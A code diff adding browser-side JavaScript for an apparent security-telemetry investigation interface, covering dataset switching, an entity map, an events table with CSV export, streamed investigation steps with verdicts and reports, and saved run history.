+      updateEmpty();
+      toast("Could not load telemetry: " + e.message, "error");
+      els.dbHint.textContent = "load failed";
+      els.globalDialogTableWrap.innerHTML = '<p class="table-empty">' + escapeHtml(e.message) + "</p>";
+    }
+  }
+
+  async function switchDatabase(path) {
+    if (!path || path === state.dbPath) return true;
+    if (state.generating) {
+      toast("Stop the current investigation before switching datasets", "error");
+      return false;
+    }
+    var previous = state.dbPath;
+    els.dbHint.textContent = "switching…";
+    try {
+      await api("/api/databases/set", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ db_path: path }),
+      });
+      state.dbPath = path;
+      renderDatabases();
+      newInvestigation({ keepPrompt: true, quiet: true });
+      await loadEvents();
+      renderExamples();
+      setDbChrome();
+      return true;
+    } catch (e) {
+      state.dbPath = previous;
+      renderDatabases();
+      toast("Could not switch dataset: " + e.message, "error");
+      return false;
+    }
+  }
+
+  // ---------------------------------------------------------------- map / tree
+
+  function rebuildGraph() {
+    var source = state.events;
+    if (state.scopeEventIds && state.scopeEventIds.size) {
+      source = state.events.filter(function (e) {
+        return state.scopeEventIds.has(e.event_id);
+      });
+    }
+    state.graphData = window.TelemetryGraph.build(source);
+    state.nodeById = new Map();
+    state.graphData.nodes.forEach(function (n) {
+      state.nodeById.set(n.id, n);
+    });
+    state.selectedId = null;
+    closeInspector();
+    A1Tree.reset();
+    renderLegend();
+    renderMap();
+    els.evidenceBadge.textContent = String(state.graphData.nodes.length);
+  }
+
+  function renderTree() {
+    if (!window.A1Tree) return;
+    A1Tree.render(els.graphCanvasContainer, state.graphData, {
+      query: els.graphSearchInput ? els.graphSearchInput.value : "",
+      hiddenTypes: state.hiddenTypes,
+      selectedId: state.selectedId,
+      evidenceScope: !!state.scopeEventIds,
+      onSelect: selectNode,
+    });
+  }
+
+  function renderMap() {
+    var links = state.mapView === "links";
+    els.mapViewTree.classList.toggle("is-active", !links);
+    els.mapViewLinks.classList.toggle("is-active", links);
+    els.mapViewTree.setAttribute("aria-pressed", String(!links));
+    els.mapViewLinks.setAttribute("aria-pressed", String(links));
+    els.graphCanvasContainer.hidden = links;
+    els.processLinksContainer.hidden = !links;
+    els.treeCollapseBtn.hidden = links;
+    els.graphLegend.hidden = links;
+    if (links) {
+      if (window.A1Links) {
+        A1Links.render(els.processLinksContainer, state.graphData, {
+          query: els.graphSearchInput ? els.graphSearchInput.value : "",
+          selectedId: state.selectedId,
+          onSelect: selectNode,
+        });
+      }
+    } else {
+      renderTree();
+    }
+    updateMapStats();
+  }
+
+  function setMapView(view) {
+    if (state.mapView === view) return;
+    state.mapView = view;
+    renderMap();
+  }
+
+  function renderLegend() {
+    var counts = {};
+    state.graphData.nodes.forEach(function (n) {
+      counts[n.type] = (counts[n.type] || 0) + 1;
+    });
+    var order = window.TelemetryGraph.TYPE_ORDER.filter(function (t) {
+      return counts[t];
+    });
+    els.graphLegend.innerHTML = order
+      .map(function (t) {
+        var meta = window.TelemetryGraph.TYPES[t];
+        var off = state.hiddenTypes.has(t);
+        if (t === "host") {
+          return '<span class="type-chip is-static"><i style="background:' + meta.color + '"></i>' + meta.label + "<b>" + counts[t] + "</b></span>";
+        }
+        return (
+          '<button class="type-chip' + (off ? " is-off" : "") + '" data-type="' + t + '" aria-pressed="' + String(!off) + '">' +
+          '<i style="background:' + meta.color + '"></i>' + meta.label + "<b>" + counts[t] + "</b></button>"
+        );
+      })
+      .join("");
+  }
+
+  function updateMapStats() {
+    var meta = state.graphData.meta || {};
+    var links = state.mapView === "links";
+    var active = links ? els.processLinksContainer : els.graphCanvasContainer;
+    var bits;
+    if (links) {
+      bits = [active.dataset.summary || "0 processes", (meta.hosts || 0) + (meta.hosts === 1 ? " host" : " hosts")];
+    } else {
+      bits = [
+        state.graphData.nodes.length + " entities",
+        state.graphData.edges.length + " links",
+        (meta.hosts || 0) + (meta.hosts === 1 ? " host" : " hosts"),
+      ];
+      if (state.hiddenTypes.size) bits.push(state.hiddenTypes.size + " types hidden");
+    }
+    if (state.scopeEventIds) bits.push("scoped to " + state.scopeEventIds.size + " evidence events");
+    var q = els.graphSearchInput.value.trim();
+    if (q) bits.push((active.dataset.count || "0") + " matching");
+    els.graphStats.textContent = bits.join(" · ");
+    els.scopeClearBtn.hidden = !state.scopeEventIds;
+    els.graphNodeCountBadge.textContent = String(state.graphData.nodes.length);
+  }
+
+  function toggleType(type) {
+    if (type === "host") return;
+    if (state.hiddenTypes.has(type)) state.hiddenTypes.delete(type);
+    else state.hiddenTypes.add(type);
+    renderMap();
+    renderLegend();
+  }
+
+  function selectNode(id) {
+    var node = state.nodeById.get(id);
+    if (!node) return;
+    state.selectedId = id;
+    A1Tree.selectOnly(els.graphCanvasContainer, id);
+    if (window.A1Links) A1Links.select(id);
+    openInspector(node);
+  }
+
+  function openInspector(node) {
+    var meta = window.TelemetryGraph.TYPES[node.type] || { label: node.type, color: "#8b98a5" };
+    els.inspectorTypeBadge.textContent = meta.label;
+    els.inspectorTypeBadge.style.color = meta.color;
+    els.inspectorTitle.textContent = node.label;
+    els.inspectorSubtitle.textContent = node.detail || "";
+
+    var html = "";
+    html += '<div class="inspector-actions"><button class="ghost-btn" data-inspector="copy">Copy entity</button></div>';
+
+    if (node.attrs && node.attrs.length) {
+      html += '<h3 class="inspector-h">Attributes</h3><table class="kv">';
+      node.attrs.forEach(function (a) {
+        if (!a[1]) return;
+        html += "<tr><th>" + escapeHtml(a[0]) + "</th><td>" + escapeHtml(a[1]) + "</td></tr>";
+      });
+      html += "</table>";
+    }
+
+    var rels = state.graphData.edges.filter(function (e) {
+      return e.from === node.id || e.to === node.id;
+    });
+    if (rels.length) {
+      html += '<h3 class="inspector-h">Relations <span class="count">' + rels.length + "</span></h3><ul class=\"rels\">";
+      rels.slice(0, 60).forEach(function (e) {
+        var out = e.from === node.id;
+        var otherId = out ? e.to : e.from;
+        var other = state.nodeById.get(otherId);
+        var otherMeta = other ? window.TelemetryGraph.TYPES[other.type] : null;
+        html +=
+          '<li><button class="rel" data-goto="' + escapeHtml(otherId) + '">' +
+          '<span class="rel-dir">' + (out ? "→" : "←") + "</span>" +
+          '<span class="rel-type">' + escapeHtml(e.label || e.rel) + "</span>" +
+          '<span class="rel-target" style="color:' + (otherMeta ? otherMeta.color : "inherit") + '">' +
+          escapeHtml(other ? other.label : otherId) + "</span>" +
+          (e.count > 1 ? '<b class="rel-count">×' + e.count + "</b>" : "") +
+          "</button></li>";
+      });
+      html += "</ul>";
+    }
+
+    if (node.events && node.events.length) {
+      html += '<h3 class="inspector-h">Source events <span class="count">' + node.eventCount + "</span></h3><ul class=\"rel-events\">";
+      node.events.slice(0, 20).forEach(function (ev) {
+        html +=
+          '<li><button class="rel ev-link" data-event="' + escapeHtml(ev.id) + '">' +
+          '<span class="ev-time">' + escapeHtml(ev.ts ? fmtShort(ev.ts) : "") + "</span>" +
+          '<span class="ev-action">' + escapeHtml(ev.action || "event") + "</span></button></li>";
+      });
+      html += "</ul>";
+      if (node.eventCount > node.events.length) {
+        html += '<p class="inspector-note">Showing ' + node.events.length + " of " + node.eventCount + " events.</p>";
+      }
+    }
+
+    els.inspectorBody.innerHTML = html;
+    els.graphInspectorDrawer.classList.add("is-open");
+    els.graphInspectorDrawer.setAttribute("aria-hidden", "false");
+  }
+
+  function closeInspector() {
+    els.graphInspectorDrawer.classList.remove("is-open");
+    els.graphInspectorDrawer.setAttribute("aria-hidden", "true");
+    if (window.A1Links) A1Links.select("");
+  }
+
+  function scopeEvidence(ids) {
+    var present = new Set(state.events.map(function (e) { return e.event_id; }));
+    var real = new Set();
+    ids.forEach(function (id) {
+      if (present.has(id)) real.add(id);
+    });
+    if (!real.size) {
+      toast("The evidence ids in this pack are not in the loaded telemetry", "error");
+      return;
+    }
+    state.scopeEventIds = real;
+    rebuildGraph();
+    openDrawer("graph");
+  }
+
+  // ---------------------------------------------------------------- events table
+
+  function eventRow(e) {
+    var d = e.details || {};
+    var host = hostOfEvent(e) || "—";
+    var proc = d["process.name"] || d["process_name"] || d["data.win.eventdata.image"] || "—";
+    var target =
+      d["file.path"] ||
+      d["registry.path"] ||
+      d["data.win.eventdata.targetObject"] ||
+      (d["destination.ip"] ? d["destination.ip"] + (d["destination.port"] ? ":" + d["destination.port"] : "") : "") ||
+      (d["dest_ip"] ? (d["src_ip"] ? d["src_ip"] + " → " : "") + d["dest_ip"] + (d["dest_port"] ? ":" + d["dest_port"] : "") : "") ||
+      d["dns.question.name"] ||
+      d["dns.rrname"] ||
+      "";
+    var cmd = d["process.command_line"] || d["data.win.eventdata.commandLine"] || "";
+    var summary = d["rule.description"] || d["alert.signature"] || target || (cmd ? cmd.slice(0, 100) : "");
+    return {
+      id: e.event_id || "",
+      time: eventTime(e),
+      host: String(host),
+      action: String(e.action || d["event_type"] || "event"),
+      proc: String(proc).replace(/^.*[\\/]/, ""),
+      summary: String(summary),
+      raw: rawJson(e),
+    };
+  }
+
+  function rawJson(e) {
+    var raw = e.raw_json;
+    if (typeof raw === "string") {
+      try {
+        return JSON.stringify(JSON.parse(raw), null, 2);
+      } catch (err) {
+        return raw;
+      }
+    }
+    if (raw && typeof raw === "object") {
+      try {
+        return JSON.stringify(raw, null, 2);
+      } catch (err) {
+        return "";
+      }
+    }
+    try {
+      return JSON.stringify(e.details || {}, null, 2);
+    } catch (err) {
+      return "";
+    }
+  }
+
+  function renderTelemetryTable() {
+    if (!state.events.length) {
+      els.globalDialogTableWrap.innerHTML = '<p class="table-empty">No events loaded for this dataset.</p>';
+      els.globalDialogMeta.textContent = "0 events";
+      els.globalDialogCountBadge.textContent = "";
+      state.tableRows = [];
+      return;
+    }
+    els.globalDialogMeta.textContent = state.events.length + " of " + state.eventTotal + " events · newest first";
+    filterTelemetryTable();
+  }
+
+  function filterTelemetryTable() {
+    var q = els.globalDialogSearchInput.value.trim().toLowerCase();
+    var rows = state.events.map(eventRow).filter(function (r) {
+      if (!q) return true;
+      return (r.host + " " + r.action + " " + r.proc + " " + r.summary + " " + r.id).toLowerCase().indexOf(q) >= 0;
+    });
+    state.tableRows = rows;
+    els.globalDialogCountBadge.textContent = rows.length + (rows.length === 1 ? " event" : " events");
+    if (!rows.length) {
+      els.globalDialogTableWrap.innerHTML = '<p class="table-empty">No event matches “' + escapeHtml(q) + "”.</p>";
+      els.globalDialogMeta.textContent = state.events.length + " of " + state.eventTotal + " events";
+      return;
+    }
+    var body = rows
+      .slice(0, 800)
+      .map(function (r, i) {
+        return (
+          '<tr class="erow" data-i="' + i + '" tabindex="0" aria-expanded="false">' +
+          '<td class="c-time" title="' + escapeHtml(r.time) + '">' + escapeHtml(fmtShort(r.time)) + "</td>" +
+          '<td class="c-action">' + escapeHtml(r.action) + "</td>" +
+          '<td class="c-host">' + escapeHtml(r.host) + "</td>" +
+          '<td class="c-proc" title="' + escapeHtml(r.proc) + '">' + escapeHtml(r.proc) + "</td>" +
+          '<td class="c-sum" title="' + escapeHtml(r.summary) + '">' + escapeHtml(r.summary) + "</td>" +
+          '<td class="c-id">' + escapeHtml(r.id) + "</td>" +
+          "</tr>" +
+          '<tr class="eraw" hidden><td colspan="6"><pre>' + escapeHtml(clip(r.raw, 12000)) + "</pre></td></tr>"
+        );
+      })
+      .join("");
+    els.globalDialogTableWrap.innerHTML =
+      '<table class="events"><thead><tr><th>time</th><th>action</th><th>host</th><th>process</th><th>summary</th><th>event</th></tr></thead><tbody>' +
+      body +
+      "</tbody></table>";
+    if (rows.length > 800) {
+      els.globalDialogTableWrap.insertAdjacentHTML("beforeend", '<p class="table-note">Showing first 800 of ' + rows.length + " matching events.</p>");
+    }
+  }
+
+  function csvFromRows(rows) {
+    var out = [["event_id", "timestamp", "host", "action", "process", "summary"]];
+    rows.forEach(function (r) {
+      out.push([r.id, r.time, r.host, r.action, r.proc, r.summary]);
+    });
+    return out
+      .map(function (r) {
+        return r
+          .map(function (c) {
+            return '"' + String(c).replace(/"/g, '""') + '"';
+          })
+          .join(",");
+      })
+      .join("\n");
+  }
+
+  // ---------------------------------------------------------------- markdown
+
+  function renderMarkdown(md) {
+    if (!md) return '<p class="empty-note">No content.</p>';
+    try {
+      if (window.marked && window.DOMPurify) {
+        return window.DOMPurify.sanitize(window.marked.parse(md));
+      }
+    } catch (e) {
+      /* plain fallback */
+    }
+    return escapeHtml(md).replace(/\n/g, "<br>");
+  }
+
+  // ---------------------------------------------------------------- report
+
+  function setVerdictStamp(label, conf) {
+    var v = String(label || "none").toLowerCase();
+    els.verdictStamp.dataset.verdict = v;
+    els.verdictStampLabel.textContent = v;
+    els.verdictStampConf.textContent = conf != null ? conf + "%" : "";
+  }
+
+  function clearReport() {
+    state.report = { md: "", verdict: "", at: "" };
+    els.reportStageContent.innerHTML = '<p class="empty-note">No report yet. A completed investigation writes its report here.</p>';
+    els.reportStageVerdictTag.textContent = "no verdict";
+    els.reportStageVerdictTag.dataset.verdict = "none";
+    els.reportStageVerdictTime.textContent = "";
+  }
+
+  function setReport(md, verdict) {
+    if (!md) return;
+    state.report = { md: md, verdict: verdict || "", at: new Date().toISOString() };
+    els.reportStageContent.innerHTML = renderMarkdown(md);
+    els.reportStageVerdictTag.textContent = String(verdict || "no verdict").toLowerCase();
+    els.reportStageVerdictTag.dataset.verdict = String(verdict || "none").toLowerCase();
+    els.reportStageVerdictTime.textContent = "generated " + fmtShort(new Date().toISOString());
+  }
+
+  // ---------------------------------------------------------------- turns
+
+  function createTurn(mode) {
+    var root = document.createElement("article");
+    root.className = "turn turn-a1";
+    root.dataset.mode = mode;
+    root.innerHTML =
+      '<div class="turn-head"><span class="who">a1</span><span class="turn-time">' + fmtClock(new Date().toISOString()) + "</span>" +
+      '<span class="turn-state" data-state="running">' + (mode === "chat" ? "answering" : "working") + "</span></div>" +
+      (mode === "investigate"
+        ? '<ol class="steps">' + STEPS.map(function (s) {
+            return '<li class="step" data-step="' + s[0] + '" data-state="idle"><i></i>' + s[1] + "</li>";
+          }).join("") + "</ol>"
+        : "") +
+      '<details class="think" hidden><summary>reasoning <span class="think-count">0</span></summary><div class="think-body"></div></details>' +
+      (mode === "investigate"
+        ? '<details class="tools" hidden><summary><span>tools</span><span class="tools-count">0</span></summary><div class="tool-list"></div></details>'
+        : "") +
+      '<div class="hyp"></div>' +
+      '<div class="evidence"></div>' +
+      '<div class="reply"></div>' +
+      '<div class="verdict"></div>' +
+      '<div class="report"></div>' +
+      '<div class="turn-error" hidden></div>';
+
+    var t = {
+      root: root,
+      mode: mode,
+      toolCount: 0,
+      verdictData: null,
+
+      setState: function (s, label) {
+        var el = root.querySelector(".turn-state");
+        el.dataset.state = s;
+        el.textContent = label || s;
+        if (s !== "running") {
+          root.querySelectorAll('.step[data-state="run"]').forEach(function (li) {
+            li.dataset.state = s === "failed" ? "failed" : "done";
+          });
+        }
+      },
+
+      setStep: function (key, st) {
+        var li = root.querySelector('.step[data-step="' + key + '"]');
+        if (li) li.dataset.state = st;
+      },
+
+      think: function (text) {
+        if (!text) return;
+        var box = root.querySelector(".think");
+        var body = box.querySelector(".think-body");
+        box.hidden = false;
+        var p = document.createElement("p");
+        p.textContent = text;
+        body.appendChild(p);
+        box.querySelector(".think-count").textContent = String(body.querySelectorAll("p").length);
+      },
+
+      toolCall: function (name, args) {
+        var list = root.querySelector(".tool-list");
+        root.querySelector(".tools").hidden = false;
+        var d = document.createElement("details");
+        d.className = "tool";
+        d.dataset.tool = name;
+        var argText = args && typeof args === "object" ? JSON.stringify(args) : String(args || "");
+        d.innerHTML =
+          '<summary><span class="tool-name">' + escapeHtml(name) + '</span><span class="tool-sum">' + escapeHtml(clip(argText, 90)) + "</span></summary>" +
+          '<div class="tool-body"><pre class="tool-args">' + escapeHtml(argText) + '</pre><div class="tool-result"></div></div>';
+        list.appendChild(d);
+        t.toolCount++;
+        root.querySelector(".tools-count").textContent = String(t.toolCount);
+      },
+
+      toolResult: function (name, summary, raw) {
+        var list = root.querySelector(".tool-list");
+        var found = null;
+        Array.prototype.forEach.call(list.querySelectorAll(".tool"), function (d) {
+          if (d.dataset.tool === name) found = d;
+        });
+        if (!found) {
+          t.toolCall(name, "");
+          found = list.lastElementChild;
+        }
+        var box = found.querySelector(".tool-result");
+        if (summary) {
+          var p = document.createElement("p");
+          p.className = "tool-result-line";
+          p.textContent = summary;
+          box.appendChild(p);
+        }
+        if (raw) {
+          var pre = document.createElement("pre");
+          pre.className = "tool-raw";
+          pre.textContent = clip(String(raw), 6000);
+          box.appendChild(pre);
+        }
+      },
+
+      hypotheses: function (list, evidenceMap) {
+        var wrap = root.querySelector(".hyp");
+        if (!list || !list.length) return;
+        var html = '<h3 class="turn-h">Hypotheses</h3><ul class="hyp-list">';
+        list.forEach(function (h) {
+          var text = typeof h === "string" ? h : h.hypothesis || h.text || h.description || JSON.stringify(h);
+          var info = evidenceMap && (evidenceMap[text] || evidenceMap[String(text).trim()]);
+          var status = info && info.status ? String(info.status).toLowerCase() : "";
+          var count = info ? info.event_count : null;
+          var glyph = /confirm|support|true/.test(status) ? "✓" : /refut|false/.test(status) ? "✕" : /inconclusive/.test(status) ? "?" : "·";
+          html +=
+            '<li class="hyp-item" data-status="' + escapeHtml(status || "open") + '">' +
+            '<span class="hyp-glyph">' + glyph + "</span>" +
+            '<span class="hyp-text">' + escapeHtml(text) + "</span>" +
+            (count != null ? '<span class="hyp-count">' + count + " ev</span>" : "") +
+            "</li>";
+        });
+        html += "</ul>";
+        wrap.innerHTML = html;
+      },
+
+      evidence: function (data) {
+        var wrap = root.querySelector(".evidence");
+        var timeline = data.timeline || [];
+        var ids = new Set();
+        timeline.forEach(function (e) {
+          if (!e) return;
+          var id = e.event_id || e.id;
+          if (id) ids.add(id);
+        });
+        var kept = data.total_kept_events || ids.size;
+        var html =
+          '<h3 class="turn-h">Evidence <span class="count">' + kept + " kept</span></h3>" +
+          '<p class="evidence-line">' + timeline.length + " timeline events · " + (data.excluded_count || 0) + " excluded by scope</p>" +
+          '<div class="evidence-actions">' +
+          '<button class="ghost-btn" data-ev="map">Map evidence</button>' +
+          '<button class="ghost-btn" data-ev="events">Events</button>' +
+          "</div>";
+        if (timeline.length) {
+          html += '<ul class="tl">';
+          timeline.slice(0, 8).forEach(function (e) {
+            html +=
+              '<li><span class="tl-time">' + escapeHtml(e.timestamp ? fmtShort(e.timestamp) : "—") + "</span>" +
+              '<span class="tl-host">' + escapeHtml(e.host_id || "") + "</span>" +
+              '<span class="tl-sum">' + escapeHtml(e.summary || "") + "</span></li>";
+          });
+          html += "</ul>";
+          if (timeline.length > 8) html += '<p class="evidence-line">+' + (timeline.length - 8) + " more in events.</p>";
+        }
+        wrap.innerHTML = html;
+        var mapBtn = wrap.querySelector('[data-ev="map"]');
+        var evBtn = wrap.querySelector('[data-ev="events"]');
+        if (mapBtn) {
+          mapBtn.addEventListener("click", function () {
+            if (!ids.size) {
+              toast("This pack carries no event ids to scope by", "error");
+              return;
+            }
+            scopeEvidence(ids);
+          });
+        }
+        if (evBtn) {
+          evBtn.addEventListener("click", function () {
+            openDrawer("telemetry");
+          });
+        }
+      },
+
+      reply: function (html) {
+        root.querySelector(".reply").innerHTML = html;
+      },
+
+      verdict: function (v) {
+        t.verdictData = v;
+        var verdict = String(v.verdict || "UNKNOWN").toUpperCase();
+        var conf = typeof v.confidence === "number" ? Math.round(v.confidence * 100) : null;
+        root.querySelector(".verdict").innerHTML =
+          '<div class="verdict-box" data-verdict="' + escapeHtml(verdict.toLowerCase()) + '">' +
+          '<span class="verdict-label">' + escapeHtml(verdict) + "</span>" +
+          (conf != null ? '<span class="verdict-conf">confidence ' + conf + "%</span>" : "") +
+          (v.verdict_boundary ? '<span class="verdict-bound">' + escapeHtml(v.verdict_boundary) + "</span>" : "") +
+          "</div>";
+        setVerdictStamp(verdict, conf);
+      },
+
+      report: function (md, verdict) {
+        var wrap = root.querySelector(".report");
+        if (!md) return;
+        wrap.innerHTML = '<button class="report-link">Read report <span aria-hidden="true">→</span></button>';
+        wrap.querySelector(".report-link").addEventListener("click", function () {
+          setReport(md, verdict);
+          openDrawer("report");
+        });
+      },
+
+      error: function (msg) {
+        var el = root.querySelector(".turn-error");
+        el.hidden = false;
+        el.innerHTML = "<b>Run failed</b><span>" + escapeHtml(msg) + "</span>";
+        t.setState("failed", "failed");
+      },
+    };
+    return t;
+  }
+
+  function addUserTurn(text) {
+    var art = document.createElement("article");
+    art.className = "turn turn-user";
+    art.innerHTML =
+      '<div class="turn-head"><span class="who">you</span><span class="turn-time">' + fmtClock(new Date().toISOString()) + "</span></div>" +
+      '<p class="user-text">' + escapeHtml(text) + "</p>";
+    els.messagesContainer.appendChild(art);
+  }
+
+  // ---------------------------------------------------------------- investigation
+
+  function handleStreamEvent(turn, payload) {
+    var type = payload.type;
+    var data = payload.data || payload;
+    switch (type) {
+      case "start":
+        if (data.session_id) state.sessionId = data.session_id;
+        turn.setStep("prep", "run");
+        break;
+      case "alert_prep":
+        turn.setStep("prep", "done");
+        turn.setStep("plan", "run");
+        break;
+      case "triage":
+        turn.setStep("plan", "done");
+        turn.setStep("collect", "run");
+        turn.hypotheses(data.hypotheses || [], null);
+        if (data.plan) turn.think(data.plan);
+        break;
+      case "loop":
+        break;
+      case "evidence_pack":
+        turn.setStep("collect", "done");
+        turn.setStep("pack", "done");
+        turn.setStep("verdict", "run");
+        turn.hypotheses(Object.keys(data.hypotheses_evidence || {}), data.hypotheses_evidence);
+        turn.evidence(data);
+        break;
+      case "tool_call":
+        turn.toolCall(data.tool || data.name || "tool", data.args || data.arguments || "");
+        break;
+      case "tool_result":
+        turn.toolResult(data.tool || data.name || "tool", data.summary || "", data.raw || data.output || "");
+        break;
+      case "thought":
+      case "reasoning":
+        turn.think(data.text || data.content || "");
+        break;
+      case "complete":
+        if (typeof data.reply === "string" && !data.report) {
+          turn.reply(renderMarkdown(data.reply));
+          turn.setState("done", "answered");
+          break;
+        }
+        turn.setStep("verdict", "done");
+        turn.verdict(data);
+        if (data.report) {
+          turn.report(data.report, data.verdict);
+          setReport(data.report, data.verdict);
+        }
+        turn.setState("done", "complete");
+        state.lastSessionId = state.sessionId || state.lastSessionId;
+        saveHistory({
+          id: state.sessionId,
+          query: state.currentQuery,
+          db: dbLabel(state.dbPath),
+          verdict: data.verdict || "UNKNOWN",
+          confidence: data.confidence,
+          report: data.report || "",
+          at: new Date().toISOString(),
+        });
+        break;
+      case "error":
+        turn.error(data.message || data.error || "Unknown backend error");
+        toast(data.message || "The run failed", "error");
+        break;
+      case "cancelled":
+        turn.setState("cancelled", "cancelled");
+        break;
+      default:
+        break;
+    }
+    scrollStream(type === "complete" || type === "cancelled" || type === "error");
+  }
+
+  async function streamRequest(path, body, turn) {
+    state.abort = new AbortController();
+    var res;
+    try {
+      res = await fetch(path, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+        signal: state.abort.signal,
+      });
+    } catch (e) {
+      throw new Error("Could not reach the A1 backend.");
+    }
+    if (!res.ok) {
+      var text = await res.text();
+      var msg = text;
+      try {
+        var j = JSON.parse(text);
+        msg = j.detail || j.error || text;
+      } catch (e) {
+        /* plain text body */
+      }
+      throw new Error((msg || res.statusText) + " (HTTP " + res.status + ")");
+    }
+    if (!res.body) throw new Error("This browser cannot stream responses.");
+
+    var reader = res.body.getReader();
+    var decoder = new TextDecoder();
+    var buffer = "";
+    for (;;) {
+      var chunk = await reader.read();
+      if (chunk.done) break;
+      buffer += decoder.decode(chunk.value, { stream: true });
+      var idx;
+      while ((idx = buffer.indexOf("\n\n")) >= 0) {
+        var block = buffer.slice(0, idx);
+        buffer = buffer.slice(idx + 2);
+        var lines = block.split("\n");
+        var payload = [];
+        for (var i = 0; i < lines.length; i++) {
+          if (lines[i].indexOf("data:") === 0) payload.push(lines[i].slice(5).trim());
+        }
+        if (!payload.length) continue;
+        var parsed;
+        try {
+          parsed = JSON.parse(payload.join("\n"));
+        } catch (e) {
+          continue;
+        }
+        handleStreamEvent(turn, parsed);
+      }
+    }
+  }
+
+  function setGenerating(on) {
+    state.generating = on;
+    els.sendBtn.classList.toggle("is-stop", on);
+    els.sendBtn.setAttribute("aria-label", on ? "Stop investigation" : "Send investigation");
+    els.newCaseBtn.disabled = on;
+    els.promptInput.readOnly = on;
+    els.composerHint.textContent = on ? "streaming · press stop to cancel" : "Enter to send · Shift+Enter for a new line";
+  }
+
+  async function submitPrompt(text) {
+    if (state.generating) return;
+    text = (text || "").trim();
+    if (!text) {
+      els.promptInput.focus();
+      return;
+    }
+    if (!state.dbPath) {
+      toast("Select a dataset first", "error");
+      return;
+    }
+    els.welcomeScreen.hidden = true;
+    addUserTurn(text);
+    var isFollowUp = !!state.lastSessionId;
+    var turn = createTurn(isFollowUp ? "chat" : "investigate");
+    els.messagesContainer.appendChild(turn.root);
+    scrollStream(true);
+    state.currentQuery = text;
+    state.sessionId = null;
+    state.cancelled = false;
+    setGenerating(true);
+    els.promptInput.value = "";
+    autosize();
+
+    var path = isFollowUp ? "/api/chat" : "/api/investigate";
+    var body = isFollowUp
+      ? { message: text, session_id: state.lastSessionId, provider: state.provider, model: state.model, db_path: state.dbPath }
+      : { query: text, provider: state.provider, model: state.model, db_path: state.dbPath };
+
+    try {
+      await streamRequest(path, body, turn);
+      if (turn.root.querySelector(".turn-state").dataset.state === "running") {
+        turn.setState("done", "stream closed");
+      }
+    } catch (e) {
+      if (state.cancelled) {
+        turn.setState("cancelled", "cancelled");
+      } else {
+        turn.error(e.message);
+        toast("Investigation failed: " + e.message, "error");
+      }
+    } finally {
+      state.generating = false;
+      state.abort = null;
+      setGenerating(false);
+      scrollStream();
+    }
+  }
+
+  async function stopRun() {
+    if (!state.generating) return;
+    state.cancelled = true;
+    try {
+      await api("/api/cancel", { method: "POST" });
+    } catch (e) {
+      toast("Cancel request failed: " + e.message, "error");
+    }
+    if (state.abort) state.abort.abort();
+    setGenerating(false);
+  }
+
+  function scrollStream(force) {
+    var el = els.stream;
+    var near = el.scrollHeight - el.scrollTop - el.clientHeight < 160;
+    if (force || near) el.scrollTop = el.scrollHeight;
+  }
+
+  // ---------------------------------------------------------------- history
+
+  function loadHistory() {
+    try {
+      var raw = localStorage.getItem(HISTORY_KEY);
+      state.history = raw ? JSON.parse(raw) : [];
+    } catch (e) {
+      state.history = [];
+    }
+    if (!Array.isArray(state.history)) state.history = [];
+    renderHistory();
+  }
+
+  function saveHistory(entry) {
+    if (!entry || !entry.query) return;
+    state.history = state.history.filter(function (h) {
+      return !(h.query === entry.query && (h.db || "") === (entry.db || ""));
+    });
+    state.history.unshift(entry);
+    state.history = state.history.slice(0, MAX_HISTORY);
+    try {
+      localStorage.setItem(HISTORY_KEY, JSON.stringify(state.history));
+    } catch (e) {
+      toast("Case log is full — could not save this run", "error");
+    }
+    renderHistory();
+  }
+
+  function renderHistory() {
+    if (!state.history.length) {
+      els.historyList.innerHTML = '<p class="menu-note">No saved runs.</p>';
+      return;
+    }
+    els.historyList.innerHTML = state.history
+      .map(function (h, i) {
+        return (
+          '<div class="history-row">' +
+          '<button class="history-item" data-history="' + i + '" title="' + escapeHtml(h.query) + '">' +
+          '<span class="history-verdict" data-verdict="' + escapeHtml(String(h.verdict || "").toLowerCase()) + '"></span>' +
+          '<span class="history-text">' + escapeHtml(h.query) + "</span>" +
+          '<span class="history-meta">' + escapeHtml(h.db || "") + (h.at ? " · " + escapeHtml(fmtShort(h.at)) : "") + "</span>" +
+          "</button>" +
+          '<button class="history-del" data-del="' + i + '" aria-label="Delete saved run">×</button></div>'
+        );
+      })
+      .join("");
+  }
+
+  async function openHistoryItem(i) {
+    var h = state.history[i];
+    if (!h || state.generating) return;
+    if (h.db && h.db !== dbLabel(state.dbPath)) {
+      var db = state.databases.find(function (d) {
+        return (d.name || dbLabel(d.path || d)) === h.db;
+      });
+      if (db) {
+        var ok = await switchDatabase(db.path || db);
+        if (!ok) return;
+      }
+    }
+    setCaseMenu(false);
+    els.welcomeScreen.hidden = true;
+    addUserTurn(h.query);
+    var turn = createTurn("investigate");
+    els.messagesContainer.appendChild(turn.root);
+    STEPS.forEach(function (s) {
+      turn.setStep(s[0], "done");
+    });
+    turn.setState("done", "restored");
+    if (h.verdict) {
+      turn.verdict({ verdict: h.verdict, confidence: h.confidence });
+    }
+    if (h.report) {
+      turn.report(h.report, h.verdict);
+      setReport(h.report, h.verdict);
+      openDrawer("report");
+    } else if (h.verdict) {
+      setVerdictStamp(h.verdict, h.confidence);
+    }
+    scrollStream(true);
+  }
+
+  // ---------------------------------------------------------------- drawer / views
+
+  function drawerMax() {
+    return Math.max(DRAWER_MIN, Math.min(DRAWER_MAX, window.innerWidth - 420));
+  }
+
+  function applyDrawerWidth(px) {
+    var width = Math.max(DRAWER_MIN, Math.min(drawerMax(), Number(px) || DRAWER_MIN));
+    document.documentElement.style.setProperty("--drawer-w", Math.round(width) + "px");
+    if (els.drawerGrip) els.drawerGrip.setAttribute("aria-valuenow", String(Math.round(width)));
+    return width;
+  }
+
+  function openDrawer(view) {
+    if (!state.drawerOpen) {
+      state.drawerOpen = true;
+      els.drawer.hidden = false;
+      document.body.classList.add("drawer-open");
+      els.evidenceBtn.setAttribute("aria-pressed", "true");
+      var saved = Number(localStorage.getItem(DRAWER_KEY));
+      if (saved >= DRAWER_MIN) applyDrawerWidth(saved);
+    }
+    switchView(view || state.activeView);
+  }
+
+  function closeDrawer() {
+    if (!state.drawerOpen) return;
+    state.drawerOpen = false;
+    els.drawer.hidden = true;
+    document.body.classList.remove("drawer-open");
+    els.evidenceBtn.setAttribute("aria-pressed", "false");
+    closeInspector();
+  }
+
+  function toggleDrawer() {
+    if (state.drawerOpen) closeDrawer();
+    else openDrawer(state.activeView);
+  }
+
